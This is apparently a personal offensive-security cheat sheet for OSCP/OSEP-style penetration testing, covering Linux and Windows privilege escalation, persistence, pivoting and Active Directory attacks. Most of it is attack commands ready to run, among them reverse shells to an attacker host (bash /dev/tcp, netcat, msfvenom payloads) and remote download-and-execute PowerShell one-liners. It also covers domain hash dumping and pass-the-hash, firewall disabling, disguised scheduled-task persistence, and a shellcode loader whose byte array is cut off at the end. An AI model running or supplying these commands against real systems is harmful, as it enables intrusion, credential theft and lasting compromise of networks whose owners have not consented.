💡 For exploit suggester 2: use if exploit suggester 1 don’t work

</aside>

[https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl](https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl)

```bash
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
```

### GCC Error Fixes

[https://programmerah.com/gcc-error-trying-to-exec-cc1-execvp-no-such-file-or-directory-27405/](https://programmerah.com/gcc-error-trying-to-exec-cc1-execvp-no-such-file-or-directory-27405/)

> gcc: error trying to exec 'cc1': execvp: No such file or directory
> 

```bash
find /usr/ -name "*cc1*"
export PATH=$PATH:/usr/libexec/gcc/x86_64-redhat-linux/4.8.2/
```

### Kernel 3.0.0 exploit mempodipper

[https://www.exploit-db.com/exploits/18411](https://www.exploit-db.com/exploits/18411)

Not working? Use this.

[http://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c](http://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c)

### Polkit

```bash
wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py
```

### Postgresql authenticated arbitrary command execution

[https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)

### No Full Path specified

```bash
sudo PATH=/tmp:$PATH /opt/cleanup.sh
```

### Git config privilege escalation

Run linpeas.sh

```bash
cat .linpeas.txt | grep Github
```

Or

```bash
find / -name ".git" 2> /dev/null
```

CD to the path with “.git”

```bash
git log
```

Then git show the commit hash

```bash
git show 33a53ef9a207976d5ceceddc41a199558843bf3c
```

### Consul Privilege Escalation

```bash
echo 'chmod +s /usr/bin/bash' > /tmp/e.sh
```

```bash
curl --header "X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5" --request PUT -d '{"ID": "meow", "Name": "meow", "Address": "127.0.0.1", "Port": 80, "check": {"Args": ["/usr/bin/bash", "/tmp/e.sh"], "interval": "10s", "timeout": "1s"}}' http://127.0.0.1:8500/v1/agent/service/register
```

```bash
bash -p
```

### iPython Privilege Escalation

```bash
mkdir -m 777 /opt/scripts_review/profile_default/startup -p
```

```bash
echo "import os;os.system('cat /.ssh/id_rsa > ~/dan_smith.key')" > /opt/scripts_review/profile_default/startup/poc.py
```

cd to the home directory and we get a “.key” file

### Redis Privilege Escalation

Enumerate for password first, on the attacking machine:

```bash
rlwrap nc -nlvp 6379
```

On the target:

```bash
./redis_connector_dev
```

After getting the password, on the attacking machine:

```bash
rlwrap nc -nlvp 443
```

On the target:

```bash
echo "bash -i >& /dev/tcp/$kali_ip/443 0>&1" > /dev/shm/sh
```

```bash
redis-cli --pass $pass=Gqq
```

```bash
eval 'local l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = l(); local f = io.popen("cat /dev/shm/sh | bash"); local res = f:read("*a"); f:close(); return res' 0
```

### Linux 2.6.9 (CVE-2009-2698)

[https://github.com/xiaoxiaoleo/CVE-2009-2698](https://github.com/xiaoxiaoleo/CVE-2009-2698)

### RDS (CVE-2010-3904)

[https://github.com/m0mkris/linux-kernel-exploits/tree/master/2010/CVE-2010-3904](https://github.com/m0mkris/linux-kernel-exploits/tree/master/2010/CVE-2010-3904)

### BPF Sign Privilege Escalation (CVE-2017-16995)

[https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/cve-2017-16995](https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/cve-2017-16995)

### PwnKit (CVE-2021-4034)

[https://github.com/ly4k/PwnKit](https://github.com/ly4k/PwnKit)

### Dirtyc0w (CVE-2016-5195)

[https://github.com/firefart/dirtycow](https://github.com/firefart/dirtycow)

[https://github.com/th3-5had0w/DirtyCOW-PoC/blob/main/dirtycow](https://github.com/th3-5had0w/DirtyCOW-PoC/blob/main/dirtycow)

[https://github.com/Brucetg/DirtyCow-EXP/tree/master/Linux](https://github.com/Brucetg/DirtyCow-EXP/tree/master/Linux)

```bash
./dirtycow /etc/group "$(sed '/\(sudo*\)/ s/$/,www-data/' /etc/group)"
```

[https://github.com/Brucetg/DirtyCow-EXP/tree/master/Linux](https://github.com/Brucetg/DirtyCow-EXP/tree/master/Linux)

### Python Module Hijacking

[https://rastating.github.io/privilege-escalation-via-python-library-hijacking/](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/)

### PrivEsc Guide Windows

```bash
tasklist /svc
```

```bash
dir C:\
```

```bash
dir "C:\program files (x86)"
```

```bash
whoami /priv
```

```bash
netstat -nao
```

```bash
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

```bash
wmic qfe list
```

```bash
cmdkey /list
```

```bash
REG QUERY HKLM /f pass /t REG_SZ /s
```

```bash
REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword
```

```bash
REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword /reg:64
```

```bash
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Vulnerable Privileges

- SeRestorePrivileges

```bash
mv C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
```

```bash
mv C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

```bash
rdesktop $ip
```

Enter WIN Key + U

- SeBackupPrivileges

This only works if it is a DC, if this wasn't a domain controller, there would be no NTDS.dit file to get passwords from, so we
would need to download the SYSTEM, SAM and SECURITY files instead, read HTB Blackfield guide instead

[https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960)

```bash
wbadmin start backup -quiet -backuptarget:\\dc01\c$\users\svc_backup\Desktop -include:c:\windows\ntds
```

```bash
wbadmin get versions
```

```bash
wbadmin start recovery -quiet -version:01/04/2023-16:11 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:c:\users\svc_backup\desktop -notrestoreacl
```

```bash
reg save hklm\system c:\users\svc_backup\Desktop\system
```

```bash
copy ntds.dit \\$kali_ip\EVILSHARE\ntds.dit
```

```bash
copy system \\$kali_ip\EVILSHARE\system
```

```bash
python3 secretsdump.py -ntds ntds.dit -system system LOCAL | grep Administrator
```

- SeImpersonatePrivileges

### UAC Bypass

[https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/](https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/)

<aside>
💡 The user belongs to Administrators group but have only a few privileges

</aside>

1. Confirm that UAC is configured in the system

```bash
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System | findstr -i "ConsentPromptBehaviorAdmin EnableLUA PromptOnSecureDesktop"
```

> EnableLUA 0x1, PromptOnSecureDesktop 0x1, ConsentPromptBehaviorAdmin 0x0, 0x2 or 0x5.
> 

[https://www.tenforums.com/tutorials/112621-change-uac-prompt-behavior-administrators-windows.html](https://www.tenforums.com/tutorials/112621-change-uac-prompt-behavior-administrators-windows.html)

[https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/341747f5-6b5d-4d30-85fc-fa1cc04038d4](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/341747f5-6b5d-4d30-85fc-fa1cc04038d4)

1. Clone from

[https://github.com/turbo/zero2hero](https://github.com/turbo/zero2hero)

1. Ensure **eventvwr.exe** exists and has autoElevate set to true

```bash
.\strings64.exe -accepteula c:\windows\system32\eventvwr.exe | findstr -i autoelevate
```

1. Uncomment lines 66 and 69 and change line 68 to your msfvenom-generated filename, then compile.

```bash
x86_64-w64-mingw32-gcc main.c -o msword_backup.exe
```

1. Listen on the port specified by the msfvenom-generated filename and enjoy the shell.

### PrivescCheck

Great tool to enumerate based on hardware/installed software misconfiguration

[https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1](https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1)

```bash
wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1
```

```bash
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

### Sherlock

```bash
wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
```

```bash
powershell "iex(new-object net.webclient).downloadString('http://$kali_ip/Sherlock.ps1');Find-AllVulns"
```

### PowerUp

An alternative to winPEAS

[https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)

```bash
IEX(New-Object Net.WebClient).DownloadString("http://$kali_ip/PowerUp.ps1"); Invoke-AllChecks
```

### JAWS

An alternative to winPEAS

[https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1](https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1)

### LAPS

Is LAPS installed? Dump admin’s password.

[https://www.hackingarticles.in/credential-dumpinglaps/](https://www.hackingarticles.in/credential-dumpinglaps/)

[https://malicious.link/post/2017/dump-laps-passwords-with-ldapsearch/](https://malicious.link/post/2017/dump-laps-passwords-with-ldapsearch/)

```bash
ldapsearch -x -h $ip -D \          
"$domain\$username" -w '$password' -b "dc=$subdomain1,dc=$subdomain2" \
"(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

Updated command

```bash
ldapsearch -x -H "ldap://$ip" -D "DOMAIN\user" -w 'password' -b "dc=DOMAIN,dc=COM" '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
```

### Search for Unquoted Services

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

```bash
Import-Module .\PowerUp.ps1
Get-UnquotedService
```

[https://www.exploitblizzard.com/post/windows-privilege-escalation-exploiting-unquoted-service-path](https://www.exploitblizzard.com/post/windows-privilege-escalation-exploiting-unquoted-service-path)

[https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae)

[https://www.hackhappy.org/2018/04/18/windows-privilege-escalation-with-unquoted-services/](https://www.hackhappy.org/2018/04/18/windows-privilege-escalation-with-unquoted-services/)

### JuicyPotato all you need

<aside>
💡 Windows Server 2008, Windows 7, Windows Server 2008 R2 with SeImpersonatePrivilege might be vulnerable to JuicyPotato, CVE-2011-1249, CVE-2018-8120.

</aside>

Grab **JuicyPotato.exe** here:

[https://github.com/ivanitlearning/Juicy-Potato-x86/releases](https://github.com/ivanitlearning/Juicy-Potato-x86/releases)

If error, use random CLSD from

Use the uploaded nc.exe to get system shell

[https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise)

```powershell
JP.exe -t * -p c:\windows\system32\cmd.exe -a "/c c:\wamp\www\nc.exe -e cmd.exe $yourip $yourport" -l 9002 -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

### PrintSpoofer all you need

An alternative to JuicyPotato, where SeImpersonatePrivilege set and target OS is

```bash
Windows 8.1, Windows Server 2012 R2, Windows 10 and Windows Server 2019
```

```bash
wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe
```

```bash
PrintSpoofer.exe -i -c cmd
```

### Found custom program and want to analyze the program?

Trace library calls

```bash
ltrace <path/to/program>
```

### Windows netsh disable firewall

```bash
netsh advfirewall show allprofiles
```

```bash
netsh advfirewall set allprofiles state off
```

### Shutdown Windows System Command

```bash
shutdown -r -t 15 && exit
```

### Bloodhound & Sharphound Post-Exploit Privesc

[https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe)

On the target, run

```bash
.\SharpHound.exe --memcache -c all -d SUPPORT.HTB -DomainController 127.0.0.1
```

Download the ZIP file and on kali, run

```bash
neo4j console
```

Change password at [http://127.0.0.1:7474](http://127.0.0.1:7474) and then start bloodhound, then drag the ZIP file into bloodhound.

### Find flag proof.txt

```bash
dir /b /s proof.txt
```

# Persistence

### schtasks

```jsx
schtasks /create /sc minute /mo 1 /tn RAM_Booster /tr "c:\users\alice\Desktop\rev.exe" /ru system
```

```jsx
schtasks /run /tn "RAM_Booster"
```

## Pivoting

[https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6](https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6)

[https://blog.zsec.uk/proxying-offensive/](https://blog.zsec.uk/proxying-offensive/)

[https://medium.com/geekculture/forwarding-burp-suite-traffic-through-socks-proxy-bada1124341c](https://medium.com/geekculture/forwarding-burp-suite-traffic-through-socks-proxy-bada1124341c)

### SSH perm no password access

```bash
ssh-keygen
```

```bash
ssh-copy-id -i ~/.ssh/id_rsa.pub root@$ip
```

### SSH Persistent Access (can be transferred using RSYNC)

```bash
ssh-keygen -f username
```

```bash
cp username.pub .ssh/authorized_keys
```

```bash
chmod 600 username
```

```bash
rsync -av .ssh/ rsync://$ip/username/.ssh
```

```bash
ssh -i username username@$ip
```

### Static Binaries/Tools for Pivoting

[https://github.com/ernw/static-toolbox/releases](https://github.com/ernw/static-toolbox/releases)

### Metasploit (route add/portfwd)

[https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)

### Chisel Dynamic Port Forwarding

Server

```jsx
./chisel_1.7.7_linux_amd64 server -p 8000 --reverse
```

Client

```jsx
./chisel client $kali_ip:8000 R:socks
```

/etc/proxychains4.conf

```bash
socks5 	127.0.0.1 1080
```

Nmap

```jsx
proxychains nmap -Pn -sT -n --top-ports 10 $ip
```

Double Pivoting

[https://wikihak.com/double-pivoting-with-chisel/](https://wikihak.com/double-pivoting-with-chisel/)

[https://www.hdysec.com/double-pivoting-both-metasploit-and-manual/](https://www.hdysec.com/double-pivoting-both-metasploit-and-manual/)

Kali

```jsx
./chisel_1.7.7_linux_amd64 server --socks5 -p 8000 --reverse
```

Mid 1

```jsx
./chisel client $kali_ip:8000 R:8888:socks
```

```jsx
./chisel_1.7.7_linux_386 server --socks5 -p 445 --reverse
```

Mid 2

```jsx
./chisel_1.7.7_linux_386 client $mid1_ip:445 R:9999:socks
```

/etc/proxychains4.conf

```jsx
socks5 127.0.0.1 8888
socks5 127.0.0.1 9999
```

## Active Directory

[https://github.com/jenriquezv/OSCP-Cheat-Sheets-AD](https://github.com/jenriquezv/OSCP-Cheat-Sheets-AD)

[https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#domain-enumeration](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#domain-enumeration)

### Credentials at hand

There’s many things you can enumerate with low privileges credentials

```bash
rpcclient -U DOMAIN.COM/'user'%"password" $ip
```

```bash
python3 GetNPUsers.py domain.com/ -dc-ip $ip -usersfile usernames.txt -format hashcat -outputfile hashes.txt
```

```bash
python3 GetUserSPNs.py domain.com/user:"password" -dc-ip $ip -request
```

```bash
crackmapexec smb $ip -u 'user' -p 'password' -x "whoami"
```

```bash
crackmapexec smb $ip -u 'user' -p 'password' --shares
```

```bash
python3 secretsdump.py DOMAIN.COM/user:"password"@$ip
```

```bash
bloodhound-python -u user -p 'password' -d domain.com -ns $ip -c all --zip
```

### Attacking the DC directly (Kerberos I)

Always try [GetUserSPNs.py](http://GetUserSPNs.py) if you have creds

```bash
python3 GetUserSPNs.py domain.com/svc_tgs:password -dc-ip $ip -request
```

### Attacking the DC directly (Kerberos II)

Kerbrute to enum valid usernames

[https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)

```bash
./kerbrute_linux_amd64 userenum -d domain.com /opt/SecLists/Usernames/xato-net-10-million-usernames.txt --dc $ip
```

Query ASREPRoastable accounts from the Key Distribution Center

```bash
python3 GetNPUsers.py domain.com/ -dc-ip $ip -usersfile valid_usernames.txt -format hashcat -outputfile hashes.txt
```

Crack hashes

```bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt --outfile="pw.txt"
```

List shares

```bash
smbclient -L //$ip --user=domain.com/admin%password
```

Retrieve password hashes

```bash
python3 secretsdump.py domain.com/admin:password@$ip
```

### Attacking the DC Directly (Responder - 80/445/1433) - NetNTLMv2 hash stealing

Web Service vulnerable to SSRF RFI we can use responder to steal NTLM credentials by running responder and forcing the target to connect to our web server

SMB Service that has Write permissions over a specific share we can upload a LNK, SCF or URL shortcut to point to our ico file in our local kali to steal NTLM hash

MSSQL Service that we can authenticate with could force the service to authenticate to our local kali to steal NTLM hash

```bash
responder -I tun0 -wv
```

SMB Exploit

[https://github.com/Plazmaz/LNKUp](https://github.com/Plazmaz/LNKUp)

```bash
pip2 install -r requirements.txt; python2 generate.py --host $kali_ip --type ntlm --output click.lnk
```

```bash
smbclient //$ip/$writableshare
```

```bash
put click.lnk
```

MSSQL Exploit, if xp_dirtree doesn’t work, try other commands in

[https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)

```bash
SQL> xp_dirtree '\\$kali_ip\blablabla'
```

### GenericWrite over Default Domain Policy? Use SharpGPOAbuse.exe

The rights can be identified in bloodhound or use the following commands to identify (PowerView.ps1) - must have GpoEditDeleteModifySecurity

```bash
Get-NetGPO
```

```bash
Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C02EB984F9 -TargetType User -TargetName $name
```

[https://github.com/byronkg/SharpGPOAbuse/releases](https://github.com/byronkg/SharpGPOAbuse/releases)

```bash
/SharpGPOAbuse.exe --AddLocalAdmin --UserAccount user --GPOName "Default Domain Policy"
```

```bash
gpupdate /force
```

```bash
python3 psexec.py user:password@$ip
```

### GenericWrite over a user? Disable Kerberos pre-auth

```python
Get-ADUser -Filter 'Name -like "Kim*"' | Set-ADAccountControl -doesnotrequirepreauth $true
```

### Server Operators Group to SYSTEM

```python
sc.exe config browser binpath="C:\Windows\System32\cmd.exe /c net user administrator P@ssw0rd"
```

Verify if the binary path was successfully changed, and restart the service, then log in using psexec.py

```python
sc.exe qc browser
sc.exe stop browser
sc.exe start browser
```

### WriteDACL over Domain? Create user and assign with DSYNC rights and dump hashes

```bash
net user evil P@ssw0rd /add /domain
```

```bash
net group "Exchange Windows Permissions" evil /add
```

```bash
net group "Remote Management Users" evil /add
```

```bash
$pw = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
```

```bash
$cred = New-Object System.Management.Automation.PSCredential('domain\user', $pw)
```

```bash
Add-ObjectACL -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity evil -Rights DCSync -Credential $cred -Verbose
```

Dump secrets

```bash
python3 secretsdump.py DOMAIN.COM/evil:'P@ssw0rd'@$ip
```

Login using [psexec.py](http://psexec.py) pass the hash

```bash
python psexec.py -hashes 00000000000000000000000000000000:32213b11e6aa90eb43d32c72a07ceea6 Administrator@$ip
```

[https://www.alteredsecurity.com/post/a-primer-on-dcsync-attack-and-detection](https://www.alteredsecurity.com/post/a-primer-on-dcsync-attack-and-detection)

### WriteOwner over a privileged group?

Set him as the domain object owner of that group

```bash
Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity User -Cred $cred
```

Followed by granting all rights via the ACL

```bash
Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity User -Cred $cred -Rights All
```

Finally, add him into the group

```bash
Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'User' -Cred $cred
```

### PowerShell Empire

[https://hackmag.com/security/powershell-empire/](https://hackmag.com/security/powershell-empire/)

### Kerberoasting (SPN)

[https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/](https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/)

[https://medium.com/@minix9800/evade-windows-defender-lateral-movement-to-domain-administrator-detection-e09bad251dfc](https://medium.com/@minix9800/evade-windows-defender-lateral-movement-to-domain-administrator-detection-e09bad251dfc)

```bash
START /B powershell -c "iex (New-Object System.Net.Webclient).DownloadString('http://%domain%/%psfile%');"
```

Kerberos Cheatsheet

[https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

### Crackmapexec cheat sheet

[https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/](https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/)

### Pass-the-Hash all you need to know

[https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/)

[https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/](https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/)

```bash
python psexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@$ip
```

### GMSA Passwords Retrieval

[https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/](https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/)

```bash
$gmsa = Get-ADServiceAccount -Identity <gmsa_acc> -Properties 'msds-managedpassword'
$mp = $gmsa.'msds-managedpassword'
$mp1 = ConvertFrom-ADManagedPasswordBlob $mp
```

[https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe](https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe)

```bash
.\GMSAPasswordReader.exe --accountname svc_apache
```

### Change domain user password (PowerShell PS Script)

```bash
$user = 'WEB$'
$passwd = $mp1.'CurrentPassword'
$secpass = ConvertTo-SecureString $passwd -AsPlainText -Force
$cred = new-object system.management.automation.PSCredential $user,$secpass
Invoke-Command -computername 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity
tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Password1234!'
-force)} -Credential $cred
```

### Bypass Applocker & Convenant

You can just run your executables directly at the following location (AppLocker wouldn’t prevent anything that executes in that location)

```bash
C:\Windows\System32\spool\drivers\color
```

### DNSAdmins to SYSTEM

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$kali_ip LPORT=443 -f dll > wtv.dll
```

```bash
cmd /c dnscmd localhost /config /serverlevelplugindll \\$kali_ip\EVILSHARE\wtv.dll
```

```bash
sc.exe stop dns
```

```bash
sc.exe start dns
```

## Tools

### Wine Error

```bash
wine: could not load kernel32.dll, status c0000135
```

```bash
mkdir -p ~/myapp/prefix; export WINEPREFIX=$HOME/myapp/prefix; export WINEARCH=win32; export WINEPATH=$HOME/myapp; wineboot --init; winetricks
```

[https://forum.manjaro.org/t/wine-could-not-load-kernel32-dll-status-c0000135/69811/2](https://forum.manjaro.org/t/wine-could-not-load-kernel32-dll-status-c0000135/69811/2)

### Impacket Installation

```bash
git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
```

```bash
pip3 install -r /opt/impacket/requirements.txt
```

```bash
cd /opt/impacket/ && python3 ./setup.py install
```

### Bloodhound and Neo4j

```bash
apt install bloodhound neo4j
```

### Hashcat Password Cracking

Check the mode from here

[https://hashcat.net/wiki/doku.php?id=example_hashe](https://hashcat.net/wiki/doku.php?id=example_hashe)

[https://github.com/Plazmaz/LNKUp](https://github.com/Plazmaz/LNKUp)

Alternatively

```bash
hashcat -h | grep SHA-256
```

### Crack hashes (MD5, SHA)

```bash
hashcat -a0 -m 1400 $hash /usr/share/dict/rockyou.txt
```

```bash
john --format=Raw-SHA256 --wordlist=/usr/share/dict/rockyou.txt hash.txt
```

### Other Cheat Sheets

[https://reconshell.com/oscp-cheat-sheet/](https://reconshell.com/oscp-cheat-sheet/)

[https://gist.github.com/SleepyLctl/823c4d29f834a71ba995238e80eb15f9](https://gist.github.com/SleepyLctl/823c4d29f834a71ba995238e80eb15f9)

[https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)


### OSEP Specific

### MSFVenom

PowerShell

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=$kali_ip LPORT=443 EXITFUNC=thread -f ps1
```

Linux (stageless)

```bash
msfvenom -p linux/x64/meterpreter_reverse_https LHOST=$kali_ip LPORT=443 -f elf -o program.elf
```

Linux (staged)

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$kali_ip LPORT=443 -f elf -o program.elf
```

Linux (commands)

```bash
msfvenom -p linux/x64/exec CMD="wget http://$kali_ip/rand.txt -O /var/www/html/safe.php" -f elf -o abc.elf
```

HTA

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$kali_ip LPORT=443 -e x64/zutto_dekiru -f hta-psh -o request.hta
```

ASP/ASPX

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$kali_ip LPORT=443 -f asp -o reverse.asp
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$kali_ip LPORT=443 -f aspx -o reverse.aspx
```

### HTA

Basic shell commands.

```bash
<html>
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell"); 
var res = shell.Run("ping $kali_ip");
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
```

### Macros (Docm RCE)

Use the CSharp project to encrypt payload.

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=$kali_ip LPORT=443 -f csharp
```

```bash
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] buf = new byte[689] {0xfc,0xe8,0x8f,0x00,0x00,0x00,
                0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,
                0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
                0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,
                0x01,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,0x10,0x8b,0x42,0x3c,
                0x01,0xd0,0x57,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,
                0x8b,0x48,0x18,0x50,0x8b,0x58,0x20,0x01,0xd3,0x85,0xc9,0x74,
                0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xac,
                0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,
                0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,
                0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,
                0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,
                0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,
                0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,
                0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,
                0x53,0xe8,0x54,0x00,0x00,0x00,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,
                0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x4d,0x61,0x63,0x69,0x6e,
                0x74,0x6f,0x73,0x68,0x3b,0x20,0x49,0x6e,0x74,0x65,0x6c,0x20,
                0x4d,0x61,0x63,0x20,0x4f,0x53,0x20,0x58,0x20,0x31,0x34,0x2e,
                0x34,0x3b,0x20,0x72,0x76,0x3a,0x31,0x32,0x34,0x2e,0x30,0x29,
                0x20,0x47,0x65,0x63,0x6b,0x6f,0x2f,0x32,0x30,0x31,0x30,0x30,
                0x31,0x30,0x31,0x20,0x46,0x69,0x72,0x65,0x66,0x6f,0x78,0x2f,
                0x31,0x32,0x34,0x2e,0x30,0x00,0x68,0x3a,0x56,0x79,0xa7,0xff,
                0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xbb,0x01,0x00,0x00,
                0xe8,0x73,0x01,0x00,0x00,0x2f,0x37,0x37,0x5a,0x4b,0x51,0x5f,
                0x74,0x76,0x43,0x30,0x50,0x74,0x4a,0x75,0x77,0x6e,0x69,0x37,
                0x72,0x71,0x31,0x51,0x4a,0x64,0x44,0x75,0x5a,0x7a,0x63,0x54,
                0x57,0x57,0x63,0x53,0x35,0x55,0x6f,0x34,0x5f,0x34,0x47,0x54,
                0x4c,0x73,0x4b,0x78,0x76,0x38,0x4e,0x54,0x72,0x74,0x42,0x4b,
                0x76,0x6e,0x4c,0x42,0x50,0x39,0x44,0x63,0x7a,0x4d,0x56,0x32,
                0x6f,0x4c,0x59,0x7a,0x4b,0x68,0x73,0x73,0x61,0x57,0x41,0x44,
                0x41,0x48,0x69,0x58,0x71,0x59,0x38,0x7a,0x7a,0x71,0x52,0x48,
                0x49,0x78,0x66,0x4c,0x45,0x62,0x71,0x4c,0x50,0x66,0x32,0x4c,
